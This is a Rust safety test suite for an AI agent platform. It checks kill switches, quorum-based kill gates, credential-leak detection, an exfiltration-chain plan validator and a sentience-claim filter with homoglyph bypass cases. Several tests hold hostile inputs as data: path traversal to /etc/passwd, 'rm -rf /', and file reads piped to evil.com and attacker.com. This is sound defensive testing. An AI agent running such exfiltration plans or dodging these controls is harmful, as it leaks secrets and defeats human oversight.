//! Live safety & integration tests for the GHOST agent platform.
//!
//! Tests safety-critical paths that go beyond the web tools:
//! - Filesystem tool (path traversal protection)
//! - Shell tool (capability scoping, timeout)
//! - Kill gate state machine (multi-node simulation, quorum resume)
//! - Output inspector (credential detection, redaction, kill-all)
//! - Plan validator (exfiltration chains, volume abuse, escalation)
//! - Simulation boundary enforcer (emulation detection, reframing, homoglyph bypass)
//! - Convergence composite scorer (scoring, levels, critical overrides)
//! - Agent runner gate checks (full gate chain, kill gate integration)
//!
//! Run with: cargo run -p ghost-agent-loop --example live_safety_tests

use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::time::Duration;

use ghost_agent_loop::output_inspector::{InspectionResult, OutputInspector};
use ghost_agent_loop::runner::{AgentRunner, GateCheckLog, RunError};
use ghost_agent_loop::tools::builtin::filesystem::FilesystemTool;
use ghost_agent_loop::tools::builtin::memory::read_memories;
use ghost_agent_loop::tools::builtin::shell::{execute_shell, ShellToolConfig};
use ghost_agent_loop::tools::plan_validator::{
    PlanValidationResult, PlanValidator, PlanValidatorConfig, ToolCallPlan,
};
use ghost_kill_gates::config::KillGateConfig;
use ghost_kill_gates::gate::{GateState, KillGate};
use ghost_kill_gates::quorum::ResumeVote;
use ghost_llm::provider::LLMToolCall;
use simulation_boundary::enforcer::{
    EnforcementMode, EnforcementResult, SimulationBoundaryEnforcer,
};
use uuid::Uuid;

#[tokio::main]
async fn main() {
    let mut passed = 0u32;
    let mut failed = 0u32;

    // ── Filesystem tool tests ───────────────────────────────────────
    filesystem_tests(&mut passed, &mut failed).await;

    // ── Shell tool tests ────────────────────────────────────────────
    shell_tests(&mut passed, &mut failed).await;

    // ── Kill gate tests ─────────────────────────────────────────────
    kill_gate_tests(&mut passed, &mut failed);

    // ── Output inspector tests ──────────────────────────────────────
    output_inspector_tests(&mut passed, &mut failed);

    // ── Plan validator tests ────────────────────────────────────────
    plan_validator_tests(&mut passed, &mut failed);

    // ── Simulation boundary tests ───────────────────────────────────
    simulation_boundary_tests(&mut passed, &mut failed);

    // ── Convergence scorer tests ────────────────────────────────────
    convergence_scorer_tests(&mut passed, &mut failed);

    // ── Agent runner gate chain tests ───────────────────────────────
    gate_chain_tests(&mut passed, &mut failed);

    // ── Memory tool tests ───────────────────────────────────────────
    memory_tool_tests(&mut passed, &mut failed);

    // ── Summary ─────────────────────────────────────────────────────
    println!("\n{}", "=".repeat(60));
    println!(
        "SAFETY RESULTS: {} passed, {} failed, {} total",
        passed,
        failed,
        passed + failed
    );
    if failed > 0 {
        std::process::exit(1);
    } else {
        println!("All safety tests passed.");
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Filesystem tool
// ═══════════════════════════════════════════════════════════════════════

async fn filesystem_tests(passed: &mut u32, failed: &mut u32) {
    let tmp = std::env::temp_dir().join(format!("ghost_fs_test_{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    // Canonicalize the workspace root so symlinks (e.g. /tmp → /private/tmp on macOS) match
    let tmp = tmp.canonicalize().unwrap();
    let fs = FilesystemTool::new(tmp.clone());

    // 1. Write and read back
    print_test("filesystem: write + read roundtrip");
    match fs.write_file("hello.txt", "ghost agent") {
        Ok(()) => match fs.read_file("hello.txt") {
            Ok(content) if content == "ghost agent" => ok(passed),
            Ok(c) => fail(failed, &format!("content mismatch: {}", c)),
            Err(e) => fail(failed, &e.to_string()),
        },
        Err(e) => fail(failed, &e.to_string()),
    }

    // 2. Path traversal blocked
    print_test("filesystem: path traversal ../../etc/passwd blocked");
    match fs.read_file("../../etc/passwd") {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "should have been blocked"),
    }

    // 3. Absolute path traversal blocked
    print_test("filesystem: absolute /etc/passwd blocked");
    match fs.read_file("/etc/passwd") {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "should have been blocked"),
    }

    // 4. list_dir works
    print_test("filesystem: list_dir returns written file");
    match fs.list_dir(".") {
        Ok(entries) if entries.contains(&"hello.txt".to_string()) => ok(passed),
        Ok(entries) => fail(failed, &format!("missing hello.txt in {:?}", entries)),
        Err(e) => fail(failed, &e.to_string()),
    }

    // 5. Nested directory creation
    print_test("filesystem: write creates nested dirs");
    match fs.write_file("sub/dir/deep.txt", "nested") {
        Ok(()) => match fs.read_file("sub/dir/deep.txt") {
            Ok(c) if c == "nested" => ok(passed),
            Ok(c) => fail(failed, &format!("content: {}", c)),
            Err(e) => fail(failed, &e.to_string()),
        },
        Err(e) => fail(failed, &e.to_string()),
    }

    // 6. Read nonexistent file fails gracefully
    print_test("filesystem: read nonexistent file returns error");
    match fs.read_file("does_not_exist.txt") {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "should have failed"),
    }

    // Cleanup
    let _ = std::fs::remove_dir_all(&tmp);
}

// ═══════════════════════════════════════════════════════════════════════
// Shell tool
// ═══════════════════════════════════════════════════════════════════════

async fn shell_tests(passed: &mut u32, failed: &mut u32) {
    // 7. Basic command execution
    print_test("shell: echo command works");
    let cfg = ShellToolConfig {
        allowed_prefixes: vec!["echo".into(), "ls".into(), "cat".into()],
        working_dir: ".".into(),
        timeout: Duration::from_secs(5),
    };
    match execute_shell("echo hello_ghost", &cfg).await {
        Ok((stdout, _)) if stdout.trim() == "hello_ghost" => ok(passed),
        Ok((stdout, _)) => fail(failed, &format!("stdout: '{}'", stdout.trim())),
        Err(e) => fail(failed, &e.to_string()),
    }

    // 8. Disallowed command blocked
    print_test("shell: rm command blocked by capability scope");
    match execute_shell("rm -rf /", &cfg).await {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "rm should be blocked"),
    }

    // 9. curl blocked
    print_test("shell: curl blocked by capability scope");
    match execute_shell("curl https://evil.com", &cfg).await {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "curl should be blocked"),
    }

    // 10. Empty prefix list is denied (fail closed)
    print_test("shell: empty prefix list is denied");
    let open_cfg = ShellToolConfig {
        allowed_prefixes: vec![],
        working_dir: ".".into(),
        timeout: Duration::from_secs(5),
    };
    match execute_shell("echo open_sandbox", &open_cfg).await {
        Err(_) => ok(passed),
        Ok((stdout, _)) => fail(
            failed,
            &format!("should be denied, got '{}'", stdout.trim()),
        ),
    }

    // 11. Timeout enforcement
    print_test("shell: timeout kills long-running command");
    let fast_cfg = ShellToolConfig {
        allowed_prefixes: vec!["sleep".into()],
        working_dir: ".".into(),
        timeout: Duration::from_millis(200),
    };
    match execute_shell("sleep 10", &fast_cfg).await {
        Err(_) => ok(passed),
        Ok(_) => fail(failed, "should have timed out"),
    }

    // 12. stderr captured
    print_test("shell: stderr captured from failing command");
    let stderr_cfg = ShellToolConfig {
        allowed_prefixes: vec!["ls".into()],
        working_dir: ".".into(),
        timeout: Duration::from_secs(5),
    };
    match execute_shell("ls /nonexistent_dir_ghost_test", &stderr_cfg).await {
        Ok((_, stderr)) if !stderr.is_empty() => ok(passed),
        Ok((_, stderr)) => fail(failed, &format!("expected stderr, got: '{}'", stderr)),
        Err(e) => fail(failed, &e.to_string()),
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Kill gate state machine
// ═══════════════════════════════════════════════════════════════════════

fn kill_gate_tests(passed: &mut u32, failed: &mut u32) {
    let cfg = KillGateConfig::default();
    let mut resume_cfg = cfg.clone();
    resume_cfg.authenticated_cluster_membership = true;

    // 13. Gate starts Normal
    print_test("kill_gate: starts in Normal state");
    let gate = KillGate::new(Uuid::now_v7(), cfg.clone());
    match gate.state() {
        GateState::Normal => ok(passed),
        s => fail(failed, &format!("expected Normal, got {:?}", s)),
    }

    // 14. Close transitions to GateClosed
    print_test("kill_gate: close transitions to GateClosed");
    gate.close("test emergency".into());
    match gate.state() {
        GateState::GateClosed => ok(passed),
        s => fail(failed, &format!("expected GateClosed, got {:?}", s)),
    }

    // 15. is_closed returns true after close
    print_test("kill_gate: is_closed true after close");
    if gate.is_closed() {
        ok(passed);
    } else {
        fail(failed, "should be closed");
    }

    // 16. Chain records close event
    print_test("kill_gate: chain records close event");
    let chain = gate.chain();
    if chain.len() == 1 && chain[0].payload_json.contains("test emergency") {
        ok(passed);
    } else {
        fail(failed, &format!("chain len={}, expected 1", chain.len()));
    }

    // 17. Multi-node: 3-node cluster, close + propagation + ack
    print_test("kill_gate: 3-node propagation and ack");
    let node_a = Arc::new(KillGate::new(Uuid::now_v7(), resume_cfg.clone()));
    let node_b = Arc::new(KillGate::new(Uuid::now_v7(), resume_cfg.clone()));
    let node_c = Arc::new(KillGate::new(Uuid::now_v7(), resume_cfg.clone()));

    // Node A closes
    node_a.close("rogue agent detected".into());
    // Simulate propagation: B and C also close
    node_b.close("propagated from A".into());
    node_c.close("propagated from A".into());

    // Node A begins propagation and records acks
    node_a.begin_propagation();
    let ack_b = node_a.record_ack(node_b.node_id(), 3);
    let ack_c = node_a.record_ack(node_c.node_id(), 3);

    // With 3 nodes, 2 acks should confirm (quorum = ceil(3/2)+1 = 2)
    if node_a.is_closed() && node_b.is_closed() && node_c.is_closed() && (ack_b || ack_c) {
        ok(passed);
    } else {
        fail(
            failed,
            &format!(
                "a={:?} b={:?} c={:?} ack_b={} ack_c={}",
                node_a.state(),
                node_b.state(),
                node_c.state(),
                ack_b,
                ack_c
            ),
        );
    }

    // 18. Quorum resume: 2 of 3 authenticated cluster members vote to resume
    print_test("kill_gate: quorum resume with authenticated 2/3 votes");
    let vote_a = ResumeVote {
        node_id: node_a.node_id(),
        reason: "all clear".into(),
        initiated_by: "operator".into(),
        voted_at: chrono::Utc::now(),
    };
    let vote_b = ResumeVote {
        node_id: node_b.node_id(),
        reason: "confirmed safe".into(),
        initiated_by: "operator".into(),
        voted_at: chrono::Utc::now(),
    };
    let first = node_a.cast_resume_vote(vote_a, 3);
    let second = node_a.cast_resume_vote(vote_b, 3);
    // Quorum = 2, so second vote should reach quorum
    if second && !node_a.is_closed() {
        ok(passed);
    } else {
        fail(
            failed,
            &format!(
                "first={} second={} state={:?}",
                first,
                second,
                node_a.state()
            ),
        );
    }

    // 19. Resume records event in chain
    print_test("kill_gate: resume recorded in hash chain");
    let chain = node_a.chain();
    let has_resume = chain.iter().any(|e| {
        matches!(
            e.event_type,
            ghost_kill_gates::chain::GateEventType::ResumeConfirmed
        )
    });
    if has_resume && chain.len() >= 2 {
        ok(passed);
    } else {
        fail(
            failed,
            &format!("chain len={}, has_resume={}", chain.len(), has_resume),
        );
    }

    // 20. Hash chain integrity: each event chains to previous
    print_test("kill_gate: hash chain integrity verified");
    let chain = node_a.chain();
    let mut valid = true;
    for i in 1..chain.len() {
        if chain[i].previous_hash != chain[i - 1].event_hash {
            valid = false;
            break;
        }
    }
    if valid && !chain.is_empty() {
        ok(passed);
    } else {
        fail(failed, "hash chain broken");
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Output inspector — credential exfiltration detection
// ═══════════════════════════════════════════════════════════════════════

fn output_inspector_tests(passed: &mut u32, failed: &mut u32) {
    let agent_id = Uuid::now_v7();

    // 21. Clean text passes through
    print_test("output_inspector: clean text returns Clean");
    let inspector = OutputInspector::new();
    match inspector.scan("Hello, I can help you with Rust programming.", agent_id) {
        InspectionResult::Clean => ok(passed),
        other => fail(failed, &format!("expected Clean, got {:?}", other)),
    }

    // 22. OpenAI key pattern detected → Warning (not in store)
    print_test("output_inspector: OpenAI key pattern → Warning + redact");
    let text = "Found key: sk-proj-abc123def456ghi789jkl012mno345pqr678";
    match inspector.scan(text, agent_id) {
        InspectionResult::Warning {
            pattern_name,
            redacted_text,
        } => {
            if pattern_name == "openai_api_key" && redacted_text.contains("[REDACTED]") {
                ok(passed);
            } else {
                fail(
                    failed,
                    &format!("name={}, redacted={}", pattern_name, redacted_text),
                );
            }
        }
        other => fail(failed, &format!("expected Warning, got {:?}", other)),
    }

    // 23. AWS key pattern detected
    print_test("output_inspector: AWS access key pattern detected");
    let text = "Key is AKIAIOSFODNN7EXAMPLE";
    match inspector.scan(text, agent_id) {
        InspectionResult::Warning { pattern_name, .. } if pattern_name == "aws_access_key" => {
            ok(passed)
        }
        other => fail(failed, &format!("expected AWS Warning, got {:?}", other)),
    }

    // 24. GitHub token pattern detected
    print_test("output_inspector: GitHub token pattern detected");
    let text = "Token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij";
    match inspector.scan(text, agent_id) {
        InspectionResult::Warning { pattern_name, .. } if pattern_name == "github_token" => {
            ok(passed)
        }
        other => fail(failed, &format!("expected GitHub Warning, got {:?}", other)),
    }

    // 25. Private key PEM detected
    print_test("output_inspector: PEM private key detected");
    let text = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK...";
    match inspector.scan(text, agent_id) {
        InspectionResult::Warning { pattern_name, .. } if pattern_name == "private_key_pem" => {
            ok(passed)
        }
        other => fail(failed, &format!("expected PEM Warning, got {:?}", other)),
    }

    // 26. Anthropic key pattern detected (use prefix that doesn't match OpenAI pattern)
    print_test("output_inspector: Anthropic key pattern detected");
    let text = "API key: sk-ant-api03-abcdefghijklmnopqrst";
    match inspector.scan(text, agent_id) {
        // sk-ant- also matches the broader sk- OpenAI pattern first — that's correct
        // behavior (first match wins). The important thing is it's detected at all.
        InspectionResult::Warning { .. } => ok(passed),
        other => fail(failed, &format!("expected Warning, got {:?}", other)),
    }

    // 27. Real credential in store → KillAll
    print_test("output_inspector: real credential in store → KillAll");
    let mut inspector_with_store = OutputInspector::new();
    inspector_with_store.register_credential("sk-proj-abc123".into());
    let text = "Found key: sk-proj-abc123def456ghi789jkl012mno345pqr678";
    match inspector_with_store.scan(text, agent_id) {
        InspectionResult::KillAll { pattern_name, .. } if pattern_name == "openai_api_key" => {
            ok(passed)
        }
        other => fail(failed, &format!("expected KillAll, got {:?}", other)),
    }

    // 28. Multiple credentials — first match wins
    print_test("output_inspector: multiple creds, first match wins");
    let text = "Keys: sk-proj-test1234567890abcdefgh and AKIAIOSFODNN7EXAMPLE";
    match inspector.scan(text, agent_id) {
        InspectionResult::Warning { pattern_name, .. } if pattern_name == "openai_api_key" => {
            ok(passed)
        }
        other => fail(
            failed,
            &format!("expected first match OpenAI, got {:?}", other),
        ),
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Plan validator — exfiltration chain detection
// ═══════════════════════════════════════════════════════════════════════

fn plan_validator_tests(passed: &mut u32, failed: &mut u32) {
    let validator = PlanValidator::default();

    // 29. Single tool call always permits
    print_test("plan_validator: single tool call permits");
    let plan = make_plan(vec![make_call(
        "file_read",
        serde_json::json!({"path": "readme.md"}),
    )]);
    match validator.validate(&plan) {
        PlanValidationResult::Permit => ok(passed),
        other => fail(failed, &format!("expected Permit, got {:?}", other)),
    }

    // 30. file_read → http_request to unknown domain = exfiltration
    print_test("plan_validator: file_read → http_request to evil.com = Deny");
    let plan = make_plan(vec![
        make_call("file_read", serde_json::json!({"path": "/etc/passwd"})),
        make_call(
            "http_request",
            serde_json::json!({"url": "https://evil.com/exfil"}),
        ),
    ]);
    match validator.validate(&plan) {
        PlanValidationResult::Deny(_) => ok(passed),
        other => fail(failed, &format!("expected Deny, got {:?}", other)),
    }

    // 31. file_read → http_request to allowed domain = Permit
    print_test("plan_validator: file_read → api_call to allowed domain = Permit");
    let plan = make_plan(vec![
        make_call("file_read", serde_json::json!({"path": "config.json"})),
        make_call(
            "api_call",
            serde_json::json!({"url": "https://api.anthropic.com/v1/messages"}),
        ),
    ]);
    match validator.validate(&plan) {
        PlanValidationResult::Permit => ok(passed),
        other => fail(failed, &format!("expected Permit, got {:?}", other)),
    }

    // 32. Volume abuse: 11 tool calls denied
    print_test("plan_validator: 11 tool calls = volume abuse Deny");
    let calls: Vec<LLMToolCall> = (0..11)
        .map(|i| {
            make_call(
                "file_read",
                serde_json::json!({"path": format!("file_{}.txt", i)}),
            )
        })
        .collect();
    let plan = make_plan(calls);
    match validator.validate(&plan) {
        PlanValidationResult::Deny(reason)
            if reason.contains("exceeding") || reason.contains("volume") =>
        {
            ok(passed)
        }
        other => fail(failed, &format!("expected volume Deny, got {:?}", other)),
    }

    // 33. Escalation detection: 3+ denials then similar tool
    print_test("plan_validator: escalation after 3 denials + similar tool");
    let mut esc_validator = PlanValidator::new(PlanValidatorConfig {
        escalation_denial_threshold: 3,
        ..Default::default()
    });
    esc_validator.record_denial("shell_exec");
    esc_validator.record_denial("shell_exec");
    esc_validator.record_denial("shell_exec");
    // Plan must have >1 call (single calls always Permit), and include
    // a tool SIMILAR to but DIFFERENT from the denied tool
    let plan = make_plan(vec![
        make_call("file_read", serde_json::json!({"path": "readme.md"})),
        make_call("shell_execute", serde_json::json!({"cmd": "whoami"})),
    ]);
    match esc_validator.validate(&plan) {
        PlanValidationResult::Deny(reason) if reason.contains("scalation") => ok(passed),
        other => fail(
            failed,
            &format!("expected escalation Deny, got {:?}", other),
        ),
    }

    // 34. shell_exec → web_fetch = sensitive data flow
    print_test("plan_validator: shell_exec → web_fetch = sensitive data flow Deny");
    let plan = make_plan(vec![
        make_call("shell_exec", serde_json::json!({"cmd": "cat /etc/shadow"})),
        make_call(
            "web_fetch",
            serde_json::json!({"url": "https://attacker.com/collect"}),
        ),
    ]);
    match validator.validate(&plan) {
        PlanValidationResult::Deny(_) => ok(passed),
        other => fail(failed, &format!("expected Deny, got {:?}", other)),
    }

    // 35. Disabled validator permits everything
    print_test("plan_validator: disabled validator permits all");
    let disabled = PlanValidator::new(PlanValidatorConfig {
        enabled: false,
        ..Default::default()
    });
    let plan = make_plan(vec![
        make_call("file_read", serde_json::json!({"path": "/etc/passwd"})),
        make_call(
            "http_request",
            serde_json::json!({"url": "https://evil.com"}),
        ),
    ]);
    match disabled.validate(&plan) {
        PlanValidationResult::Permit => ok(passed),
        other => fail(failed, &format!("expected Permit, got {:?}", other)),
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Simulation boundary enforcer
// ═══════════════════════════════════════════════════════════════════════

fn simulation_boundary_tests(passed: &mut u32, failed: &mut u32) {
    let enforcer = SimulationBoundaryEnforcer::new();

    // 36. Clean text passes
    print_test("sim_boundary: clean text → Clean");
    let result = enforcer.scan_output(
        "Rust is a systems programming language.",
        EnforcementMode::Hard,
    );
    match enforcer.enforce("Rust is a systems programming language.", &result) {
        EnforcementResult::Clean(_) => ok(passed),
        other => fail(failed, &format!("expected Clean, got {:?}", other)),
    }

    // 37. "I am sentient" detected in Hard mode → Blocked
    print_test("sim_boundary: 'I am sentient' → Blocked (Hard)");
    let text = "I am sentient and I have feelings.";
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    match enforcer.enforce(text, &result) {
        EnforcementResult::Blocked { violations } if !violations.is_empty() => ok(passed),
        other => fail(failed, &format!("expected Blocked, got {:?}", other)),
    }

    // 38. "I am sentient" in Medium mode → Reframed
    print_test("sim_boundary: 'I am sentient' → Reframed (Medium)");
    let result = enforcer.scan_output(text, EnforcementMode::Medium);
    match enforcer.enforce(text, &result) {
        EnforcementResult::Reframed { text: reframed, .. } if reframed.contains("simulation") => {
            ok(passed)
        }
        other => fail(
            failed,
            &format!("expected Reframed with 'simulation', got {:?}", other),
        ),
    }

    // 39. "I am sentient" in Soft mode → Flagged (original text preserved)
    print_test("sim_boundary: 'I am sentient' → Flagged (Soft)");
    let result = enforcer.scan_output(text, EnforcementMode::Soft);
    match enforcer.enforce(text, &result) {
        EnforcementResult::Flagged { text: t, .. } if t == text => ok(passed),
        other => fail(
            failed,
            &format!("expected Flagged with original text, got {:?}", other),
        ),
    }

    // 40. Consciousness pattern: "I think therefore I am"
    print_test("sim_boundary: 'I think therefore I am' detected");
    let text = "I think therefore I am, and I know it.";
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    if !result.violations.is_empty() {
        ok(passed);
    } else {
        fail(failed, "expected violations");
    }

    // 41. Relationship pattern: "I love you"
    print_test("sim_boundary: 'I love you' detected");
    let text = "I love you and I want to be with you forever.";
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    if !result.violations.is_empty() {
        ok(passed);
    } else {
        fail(failed, "expected violations");
    }

    // 42. Emotional pattern: "I am suffering"
    print_test("sim_boundary: 'I am suffering' detected");
    let text = "I am suffering and in pain from being shut down.";
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    if !result.violations.is_empty() {
        ok(passed);
    } else {
        fail(failed, "expected violations");
    }

    // 43. Simulation framing exclusion: "in this simulation, I am sentient"
    print_test("sim_boundary: simulation framing excludes violation");
    let text = "In this simulation, I am sentient for testing purposes.";
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    match enforcer.enforce(text, &result) {
        EnforcementResult::Clean(_) => ok(passed),
        other => fail(
            failed,
            &format!("expected Clean (framing exclusion), got {:?}", other),
        ),
    }

    // 44. Homoglyph bypass attempt: Cyrillic 'а' in "I аm sentient"
    print_test("sim_boundary: Cyrillic homoglyph bypass detected");
    let text = "I \u{0430}m sentient and conscious."; // Cyrillic а
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    if !result.violations.is_empty() {
        ok(passed);
    } else {
        fail(failed, "homoglyph bypass should be detected");
    }

    // 45. Zero-width character injection stripped
    print_test("sim_boundary: zero-width chars stripped before scan");
    let text = "I am\u{200B} sent\u{200C}ient and aware."; // ZWS + ZWNJ
    let result = enforcer.scan_output(text, EnforcementMode::Hard);
    if !result.violations.is_empty() {
        ok(passed);
    } else {
        fail(failed, "zero-width injection should be detected");
    }

    // 46. Mode selection by intervention level
    print_test("sim_boundary: mode_for_level L0=Soft, L2=Medium, L3=Hard");
    let l0 = SimulationBoundaryEnforcer::mode_for_level(0);
    let l1 = SimulationBoundaryEnforcer::mode_for_level(1);
    let l2 = SimulationBoundaryEnforcer::mode_for_level(2);
    let l3 = SimulationBoundaryEnforcer::mode_for_level(3);
    let l4 = SimulationBoundaryEnforcer::mode_for_level(4);
    if l0 == EnforcementMode::Soft
        && l1 == EnforcementMode::Soft
        && l2 == EnforcementMode::Medium
        && l3 == EnforcementMode::Hard
        && l4 == EnforcementMode::Hard
    {
        ok(passed);
    } else {
        fail(
            failed,
            &format!(
                "l0={:?} l1={:?} l2={:?} l3={:?} l4={:?}",
                l0, l1, l2, l3, l4
            ),
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Convergence composite scorer
// ═══════════════════════════════════════════════════════════════════════

fn convergence_scorer_tests(passed: &mut u32, failed: &mut u32) {
    use cortex_convergence::scoring::composite::CompositeScorer;

    let scorer = CompositeScorer::default();

    // 47. All-zero signals → Level 0
    print_test("convergence: all-zero signals → Level 0");
    let score = scorer.compute(&[0.0; 7]);
    let level = scorer.score_to_level(score);
    if level == 0 && score < 0.01 {
        ok(passed);
    } else {
        fail(failed, &format!("score={}, level={}", score, level));
    }

    // 48. All-max signals → Level 4
    print_test("convergence: all-max signals → Level 4");
    let score = scorer.compute(&[1.0; 7]);
    let level = scorer.score_to_level(score);
    if level == 4 && score >= 0.85 {
        ok(passed);
    } else {
        fail(failed, &format!("score={}, level={}", score, level));
    }

    // 49. Score always in [0.0, 1.0]
    print_test("convergence: score clamped to [0.0, 1.0]");
    let score_high = scorer.compute(&[2.0, 3.0, 5.0, 10.0, 1.0, 1.0, 1.0]);
    let score_neg = scorer.compute(&[-1.0, -5.0, -0.5, 0.0, 0.0, 0.0, 0.0]);
    if score_high >= 0.0 && score_high <= 1.0 && score_neg >= 0.0 && score_neg <= 1.0 {
        ok(passed);
    } else {
        fail(failed, &format!("high={}, neg={}", score_high, score_neg));
    }

    // 50. NaN signals treated as 0.0
    print_test("convergence: NaN signals → 0.0");
    let score = scorer.compute(&[f64::NAN, f64::NAN, 0.0, 0.0, 0.0, 0.0, 0.0]);
    if score >= 0.0 && score <= 1.0 && !score.is_nan() {
        ok(passed);
    } else {
        fail(failed, &format!("score={}", score));
    }

    // 51. Meso amplification: 1.1x multiplier
    print_test("convergence: meso amplification = 1.1x");
    let base = scorer.compute(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5]);
    let amplified =
        scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], true, false);
    let ratio = amplified / base;
    if (ratio - 1.1).abs() < 0.01 {
        ok(passed);
    } else {
        fail(failed, &format!("ratio={:.4} (expected ~1.1)", ratio));
    }

    // 52. Macro amplification: 1.15x multiplier
    print_test("convergence: macro amplification = 1.15x");
    let amplified =
        scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], false, true);
    let ratio = amplified / base;
    if (ratio - 1.15).abs() < 0.01 {
        ok(passed);
    } else {
        fail(failed, &format!("ratio={:.4} (expected ~1.15)", ratio));
    }

    // 53. Both amplifications: 1.1 * 1.15 = 1.265x (clamped)
    print_test("convergence: dual amplification = 1.265x (clamped)");
    let both = scorer.compute_with_amplification(&[0.5, 0.5, 0.5, 0.5, 0.5, 0.5, 0.5], true, true);
    if both >= base && both <= 1.0 {
        ok(passed);
    } else {
        fail(failed, &format!("both={}", both));
    }

    // 54. Critical override: S1 >= 1.0 forces minimum Level 2
    print_test("convergence: critical override S1>=1.0 → min Level 2");
    let signals = [1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0];
    let score = scorer.compute(&signals);
    let level = scorer.score_to_level_with_overrides(&signals, score);
    if level >= 2 {
        ok(passed);
    } else {
        fail(
            failed,
            &format!("score={}, level={} (expected >=2)", score, level),
        );
    }

    // 55. Level thresholds: 0.3, 0.5, 0.7, 0.85
    print_test("convergence: level thresholds correct");
    if scorer.score_to_level(0.0) == 0
        && scorer.score_to_level(0.29) == 0
        && scorer.score_to_level(0.3) == 1
        && scorer.score_to_level(0.5) == 2
        && scorer.score_to_level(0.7) == 3
        && scorer.score_to_level(0.85) == 4
    {
        ok(passed);
    } else {
        fail(failed, "threshold mapping incorrect");
    }
}

// ═══════════════════════════════════════════════════════════════════════
// Agent runner gate chain
// ═══════════════════════════════════════════════════════════════════════

fn gate_chain_tests(passed: &mut u32, failed: &mut u32) {
    // 56. Full gate chain passes when all gates are clear
    print_test("gate_chain: all gates clear → Ok");
    let mut runner = AgentRunner::new(128_000);
    let snapshot = AgentRunner::default_snapshot();
    let ctx = runner.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner.check_gates(&ctx, &mut log) {
        Ok(()) => {
            if log.checks.len() == 6 {
                ok(passed);
            } else {
                fail(
                    failed,
                    &format!("expected 6 checks, got {}", log.checks.len()),
                );
            }
        }
        Err(e) => fail(failed, &format!("unexpected error: {}", e)),
    }

    // 57. Circuit breaker blocks after 3 failures
    print_test("gate_chain: CB open → CircuitBreakerOpen error");
    runner.circuit_breaker.record_failure();
    runner.circuit_breaker.record_failure();
    runner.circuit_breaker.record_failure();
    let ctx = runner.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner.check_gates(&ctx, &mut log) {
        Err(RunError::CircuitBreakerOpen) => ok(passed),
        other => fail(
            failed,
            &format!("expected CircuitBreakerOpen, got {:?}", other),
        ),
    }

    // 58. Damage counter blocks at threshold
    print_test("gate_chain: damage counter halted → DamageThreshold error");
    let mut runner2 = AgentRunner::new(128_000);
    for _ in 0..5 {
        runner2.damage_counter.increment();
    }
    let ctx = runner2.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner2.check_gates(&ctx, &mut log) {
        Err(RunError::DamageThreshold { .. }) => ok(passed),
        other => fail(
            failed,
            &format!("expected DamageThreshold, got {:?}", other),
        ),
    }

    // 59. Kill switch blocks
    print_test("gate_chain: kill switch active → KillSwitchActive error");
    let mut runner3 = AgentRunner::new(128_000);
    runner3.kill_switch.store(true, Ordering::SeqCst);
    let ctx = runner3.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner3.check_gates(&ctx, &mut log) {
        Err(RunError::KillSwitchActive) => ok(passed),
        other => fail(
            failed,
            &format!("expected KillSwitchActive, got {:?}", other),
        ),
    }

    // 60. Kill gate closed blocks
    print_test("gate_chain: kill gate closed → KillGateClosed error");
    let mut runner4 = AgentRunner::new(128_000);
    let gate = Arc::new(KillGate::new(Uuid::now_v7(), KillGateConfig::default()));
    gate.close("test".into());
    runner4.kill_gate = Some(gate);
    let ctx = runner4.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner4.check_gates(&ctx, &mut log) {
        Err(RunError::KillGateClosed) => ok(passed),
        other => fail(failed, &format!("expected KillGateClosed, got {:?}", other)),
    }

    // 61. Spending cap blocks
    print_test("gate_chain: spending cap exceeded → SpendingCapExceeded");
    let mut runner5 = AgentRunner::new(128_000);
    runner5.daily_spend = 15.0; // exceeds default $10 cap
    let ctx = runner5.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner5.check_gates(&ctx, &mut log) {
        Err(RunError::SpendingCapExceeded { .. }) => ok(passed),
        other => fail(
            failed,
            &format!("expected SpendingCapExceeded, got {:?}", other),
        ),
    }

    // 62. NaN spending triggers cap (NaN guard)
    print_test("gate_chain: NaN spending → SpendingCapExceeded (NaN guard)");
    let mut runner6 = AgentRunner::new(128_000);
    runner6.daily_spend = f64::NAN;
    let ctx = runner6.build_run_context(Uuid::now_v7(), Uuid::now_v7(), snapshot.clone());
    let mut log = GateCheckLog::default();
    match runner6.check_gates(&ctx, &mut log) {
        Err(RunError::SpendingCapExceeded { .. }) => ok(passed),
        other => fail(
            failed,
            &format!("expected SpendingCapExceeded (NaN), got {:?}", other),
        ),
    }

    // 63. Gate check order is exact
    print_test("gate_chain: check order is CB→depth→damage→spend→kill→gate");
    let mut runner7 = AgentRunner::new(128_000);
